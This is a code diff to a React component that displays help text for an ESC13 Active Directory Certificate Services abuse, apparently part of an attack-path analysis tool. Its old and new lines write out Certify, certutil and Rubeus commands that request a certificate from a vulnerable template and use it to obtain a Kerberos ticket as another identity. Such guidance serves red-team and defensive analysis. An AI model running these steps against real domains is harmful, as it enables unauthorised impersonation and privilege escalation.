@@ -24,11 +24,11 @@ const WindowsAbuse: FC = () => {
                 The principal can now perform an ESC13 abuse with the following steps:
             </Typography>
             <Typography variant='body2'>
-                <b>Step 1</b>: Use Certify to request enrollment in the affected template, specifying the affected
+                <b>Step 1</b>: Use Certify (2.0) to request enrollment in the affected template, specifying the affected
                 certification authority:
             </Typography>
             <Typography component={'pre'}>
-                {'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC13"'}
+                {'Certify.exe request --ca rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA --template ESC13'}
             </Typography>
             <Typography variant='body2'>
                 If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
@@ -39,24 +39,19 @@ const WindowsAbuse: FC = () => {
                 attribute by default, but neither users nor computers can write to their own 'mail' attribute by
                 default.
             </Typography>
-            <Typography variant='body2'>Save the certificate as cert.pem and the private key as cert.key.</Typography>
             <Typography variant='body2'>
-                <b>Step 2</b>: Convert the emitted certificate to PFX format:
+                The certificate PFX is printed to the console in a base64-encoded format.
             </Typography>
-            <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
+
             <Typography variant='body2'>
-                <b>Step 3</b>: Optionally purge all kerberos tickets from memory:
-            </Typography>
-            <Typography component={'pre'}>{'klist purge'}</Typography>
-            <Typography variant='body2'>
-                <b>Step 4</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
-                attacker identity, the PFX-formatted certificate created in Step 2, and the certificate password:
+                <b>Step 2</b>: With Rubeus, use the certificate to authenticate to the domain and request a TGT,
+                specifying the identity you intend to impersonate:
             </Typography>
             <Typography component={'pre'}>
-                {'Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt'}
+                {'Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:<cert base64> /ptt'}
             </Typography>
             <Typography variant='body2'>
-                <b>Step 5</b>: Optionally verify the TGT by listing it with the klist command:
+                <b>Step 3</b>: Optionally verify the TGT by listing it with the klist command:
             </Typography>
             <Typography component={'pre'}>{'klist'}</Typography>
         </>
